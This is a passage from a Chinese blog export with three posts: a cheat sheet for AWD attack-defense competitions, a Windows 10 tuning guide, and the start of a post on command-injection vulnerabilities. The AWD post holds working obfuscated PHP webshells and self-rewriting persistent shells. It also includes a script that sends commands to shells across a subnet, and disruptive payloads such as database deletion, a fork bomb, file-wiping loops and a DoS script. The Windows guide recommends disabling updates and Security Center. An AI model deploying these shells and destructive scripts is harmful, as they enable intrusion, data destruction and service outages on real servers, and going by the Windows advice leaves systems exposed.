-<h2 id="修改数据库密码及备份数据库"><a href="#修改数据库密码及备份数据库" class="headerlink" title="修改数据库密码及备份数据库"></a>修改数据库密码及备份数据库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; set password=password(&#x27;new password&#x27;);</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">2. 修改 mysql user 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set password=password(&#x27;new password&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">3. 使用 GRANT 语句</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;new password&#x27; WITH GRANT OPTION;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">4. mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root password &quot;new password&quot;;（注意双引号或不加）</span><br></pre></td></tr></table></figure>
-
-<p>数据库恢复，在mysql终端执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令格式：source FILE_PATH</span><br><span class="line">source ~/db.sql（原数据库需存在）</span><br></pre></td></tr></table></figure>
-
-<h2 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h2><p>备份！备份！备份！</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打包目录</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h2 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用批量脚本后门攻击其他靶机。</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用工具对目标网站进行扫描，目标服务器开放的端口，方便进行漏洞利用。</p>
-<p>扫描工具：Namp，御剑等等。</p>
-<p>以下是一些服务端口的漏洞：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22：  ssh弱口令</span><br><span class="line">873： 未授权访问漏洞</span><br><span class="line">3306：mysql弱口令</span><br><span class="line">6379：redis未授权访问漏洞</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="WebShell隐藏与利用"><a href="#WebShell隐藏与利用" class="headerlink" title="WebShell隐藏与利用"></a>WebShell隐藏与利用</h2><p><strong>隐藏shell</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件命名形式：</span><br><span class="line">.shell.php</span><br><span class="line">-shell.php</span><br></pre></td></tr></table></figure>
-
-<p><strong>特殊Shell形式</strong></p>
-<p>1、连接方式：php?2=assert密码是1。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="number">2</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>2、配置为?b=))99(rhC(tseuqeR+lave</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">chr</span>( <span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">chr</span>( <span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">chr</span>( <span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">chr</span>( <span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line"><span class="variable">$e</span>= <span class="string">&#x27;($_REQUEST[C])&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>.<span class="variable">$e</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>3、配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>连接密码:0（零）</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sF</span>= <span class="string">&quot;PCT4BA6ODSE_&quot;</span>;<span class="variable">$s21</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$sF</span>[<span class="number">4</span>].<span class="variable">$sF</span>[<span class="number">5</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">6</span>].<span class="variable">$sF</span>[<span class="number">3</span>].<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">1</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>]);<span class="variable">$s22</span>=$&#123;<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">0</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">2</span>])&#125;[<span class="string">&#x27;n985de9&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s22</span>))&#123;<span class="keyword">eval</span>(<span class="variable">$s21</span>(<span class="variable">$s22</span>));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>4、MD5木马</p>
-<p>将pass中换成你熟悉的Md5，防止他人利用。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>5、MD5木马+利用header</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] == <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$test</span>= <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;flag:<span class="subst">$test</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>上传不死马</strong></p>
-<p>例子</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;</span>cmd<span class="string">&#x27;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#passwd=y0range857</span></span><br><span class="line"><span class="comment">#POST传参：passwd=y0range857&amp;a=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>
-
-<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，用蚁剑连接。</p>
-<p><strong>双写入shell</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.login.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file1</span> = <span class="string">&#x27;/admin/.register.php&#x27;</span>; </span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file1</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>浏览器访问at.php，生产不死马at2.php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/upload/at.php</span><br><span class="line">获取命令</span><br><span class="line">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h2 id="alias起别名"><a href="#alias起别名" class="headerlink" title="alias起别名"></a>alias起别名</h2><p>将攻击命令用改成别的命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">&quot;echo nothing&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>删除</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unalias -a</span><br></pre></td></tr></table></figure>
-
-<p>对方执行cat /flag命令的时候回显就是错误flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias cat=&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br></pre></td></tr></table></figure>
-
-<p>获取 flag 一般是 curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">&#x27;echo fuckoff&#x27;</span> <span class="comment">#权限要求较低，可以在这里改成虚假的flag</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">chmod</span> -x curl <span class="comment">#权限要求较高</span></span><br><span class="line">/usr/bin curl路径</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="扰乱比赛方式-慎用"><a href="#扰乱比赛方式-慎用" class="headerlink" title="扰乱比赛方式(慎用)"></a>扰乱比赛方式(慎用)</h2><p>无限复制</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">randstr</span>().<span class="string">&#x27;.php&#x27;</span>,<span class="title function_ invoke__">file_get_content</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">      <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>修改数据库密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;p4rr0t&#x27;);# 修改所有用户密码</span><br><span class="line">flush privileges;</span><br><span class="line">UPDATE mysql.user SET User=&#x27;aaaaaaaaaaaa&#x27; WHERE user=&#x27;root&#x27;; </span><br><span class="line">flush privileges;</span><br><span class="line">delete from mysql.user ;#删除所有用户</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
-
-<p>重启 apache2 和 nigix</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env sh</span></span><br><span class="line"><span class="keyword">while</span> [[ 1 ]]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line"><span class="keyword">done</span> &amp;</span><br></pre></td></tr></table></figure>
-
-<p>循环删除</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getfiles</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>) <span class="keyword">as</span> <span class="variable">$afile</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$afile</span>))</span><br><span class="line">                <span class="title function_ invoke__">getfiles</span>(<span class="variable">$afile</span>.<span class="string">&#x27;/*.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$afile</span>,<span class="string">&quot;#Anything#&quot;</span>);</span><br><span class="line">                <span class="comment">//unlink($afile);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">getfiles</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;unlink&#x27;</span>, <span class="title function_ invoke__">glob</span>(<span class="string">&quot;some/dir/*.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>删除数据库</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">  <span class="keyword">import</span> base64</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">rm_db</span>(<span class="params">db_user,my_db_passwd</span>):</span><br><span class="line">      cmd = <span class="string">&quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;</span>%(db_user,my_db_passwd)</span><br><span class="line">      db_name = [<span class="string">&#x27;performance_schema&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">      <span class="keyword">for</span> db <span class="keyword">in</span> db_name:</span><br><span class="line">          cmd += <span class="string">&quot;drop database %s;&quot;</span>%db</span><br><span class="line">      cmd += <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">      <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
-
-<p>fork_bomb</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/echo <span class="string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure>
-
-<p>DOS脚本（非必要最好不要用）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="built_in">max</span>=<span class="number">90000000</span></span><br><span class="line">port=<span class="number">80</span>                 <span class="comment">#端口</span></span><br><span class="line">host=<span class="string">&quot;192.168.92.154&quot;</span>   <span class="comment">#IP</span></span><br><span class="line">page=<span class="string">&quot;/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">bag=(<span class="string">&quot;POST %s HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;host: %s\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Content-Length: 1000000000\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Cookie: 1998\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span> % (page,host))</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> socks</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">max</span>):</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.connect((host,port))</span><br><span class="line">            s.send(bag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            socks.append(s)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>():</span><br><span class="line">    <span class="keyword">global</span> socks</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> socks:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;攻击中....&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">One = threading.Thread(target=connect,args=())</span><br><span class="line">Two = threading.Thread(target=send,args=())</span><br><span class="line">One.start()</span><br><span class="line">Two.start()</span><br></pre></td></tr></table></figure>
-
-<p>在加固阶段，每个堡垒机都有一个Web在运行。而这些站点可能存在相应的漏洞和后门。基本上都会有shell留在隐秘的角落…</p>
-<p>所以我们就可以通过前期搜寻到的后门，进行操作。这里直接用linux的防火墙进行关闭即可。</p>
-<p>在正常情况下：这样的话就直接把系统的后门全杀掉了。只允许22 80 21端口可以进行访问。</p>
-<p>首先开启 22 80 21</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br></pre></td></tr></table></figure>
-
-<p>然后关闭</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -j DROP</span><br></pre></td></tr></table></figure>
-
-<p>在手动一个个连shell搅shi的话，是非常慢的。于是写了个小脚本。</p>
-<p>遍历整个IP段，并将防火墙开启全部屏蔽掉~~</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.182&quot;</span></span><br><span class="line">port=<span class="string">&#x27;80&#x27;</span></span><br><span class="line">shell = <span class="string">&quot;/shell.php&quot;</span></span><br><span class="line">passwd = <span class="string">&quot;a&quot;</span></span><br><span class="line">payloads = &#123;</span><br><span class="line">    passwd:<span class="string">&quot;system(\&#x27;iptables -A INPUT -j DROP&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    urls = url+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+port+shell</span><br><span class="line">    <span class="built_in">print</span>(urls+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(urls,payloads,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到主机&quot;</span>)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Win10使用优化</title>
-    <url>/posts/f970716d.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下在win10的 游荡历程，保护一下个人隐私，简化使用，炫酷的大爷可以绕过，希望给各位大爷提供带点有用帮助。勿喷</p>
-<h1 id="关闭自动更新"><a href="#关闭自动更新" class="headerlink" title="关闭自动更新"></a>关闭自动更新</h1><p>相对旧机子，更新后的系统可能会影响电脑的使用体验，所以建议关闭自动更新，当你想更新时子再更新</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.右键&quot;此电脑&quot;，选择&quot;管理&quot;。</span><br><span class="line">2.选择&quot;服务和应用程序=&gt;服务&quot;、然后找到&quot;Windows Update&quot;双击打开 （这里是用名称排序的，从W开始找比较快。）</span><br><span class="line">3.在&quot;常规&quot;选项卡下，把启动类型改为 &quot;禁用&quot;。</span><br><span class="line">4.点击&quot;恢复&quot;选项卡，将&quot;第一次失败&quot;、&quot;第二次失败&quot;、&quot;后续失败&quot;都改为&quot;无操作&quot;，然后点击&quot;确定&quot;（这步非常重要，否则自动更新还会自动开启。</span><br></pre></td></tr></table></figure>
-
-<p><strong>关闭计划任务</strong></p>
-<p>在桌面找到<strong>我的电脑</strong>，右键<strong>管理，</strong>然后依次点击<strong>系统工具，任务计划程序，任务计划程序库，microsoft，windows，windows update，将里面的选项都右键</strong>禁用。</p>
-<h1 id="关闭最近使用文件"><a href="#关闭最近使用文件" class="headerlink" title="关闭最近使用文件"></a>关闭最近使用文件</h1><p>步骤如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开此电脑</span><br><span class="line">切换到选项卡，点击进入</span><br><span class="line">在常规下，隐私内关闭即可</span><br></pre></td></tr></table></figure>
-
-<h1 id="关闭win10一些服务"><a href="#关闭win10一些服务" class="headerlink" title="关闭win10一些服务"></a>关闭win10一些服务</h1><p>在桌面上找到 此电脑 右键—-管理 点击。</p>
-<p>然后如图所示，点开服务。</p>
-<p><strong>关闭并禁用这些服务</strong></p>
-<p><strong>Connected User Experiences and Telemetry</strong></p>
-<p>一个微软操作系统外围辅助服务。这项服务除了收集数据之外，还兼有收集错误和崩溃信息的职责，因此对于微软改进系统也有重要的意义。如果你不介意微软收集这些信息，可以保持服务的开启状态。</p>
-<p><strong>Diagnostic Execution Service</strong></p>
-<p>系统诊断执行服务 没什么卵用</p>
-<p><strong>HomeGroup Listener和HomeGroupProvider</strong></p>
-<p>家庭组服务，没什么卵用.</p>
-<p><strong>windows server</strong></p>
-<p>如果不经常使用系统搜索就关闭它</p>
-<p><strong>Program CompatibilityAssistant Service</strong></p>
-<p>兼容助手服务，</p>
-<p><strong>SecurityCenter</strong></p>
-<p>安全中心服务，直接禁用</p>
-<p><strong>SysMain</strong></p>
-<p>这个服务如果电脑上全部都是固态，可以关闭，要是有机械的话，有一定的作用。</p>
-<p>以上服务全部禁用。</p>
-<h1 id="关闭系统界面特效，优化系统性能"><a href="#关闭系统界面特效，优化系统性能" class="headerlink" title="关闭系统界面特效，优化系统性能"></a><strong>关闭系统界面特效，优化系统性能</strong></h1><p>如果选择 最佳性能的话，字体比较难看，看的不习惯，勾选 平滑字体边缘。其他的根据自己需要勾选，不在乎字体的话，直接 最佳性能</p>
-<p>只勾选：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">平滑滚动列表框</span><br><span class="line">平滑屏幕字体边缘</span><br><span class="line">启用速览</span><br></pre></td></tr></table></figure>
-
-<p>顺便设置下 系统启动设置</p>
 ]]></content>
       <categories>
         <category>win系统</category>
       </categories>
       <tags>
         <tag>win10</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行漏洞</title>
-    <url>/posts/a43e8dc0.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
-<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
-<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
-
-<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<p>Linux下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
